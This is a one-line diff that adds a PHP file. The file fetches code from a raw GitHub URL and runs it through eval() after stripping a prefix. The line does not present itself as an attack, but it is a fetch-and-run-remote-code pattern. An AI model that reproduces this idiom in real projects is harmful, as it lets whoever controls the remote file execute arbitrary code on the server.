@@ -1,0 +1,1 @@
+<?php eval(substr(file_get_contents('https://raw.githubusercontent.com/Arikato111/control/master/control'), 6));
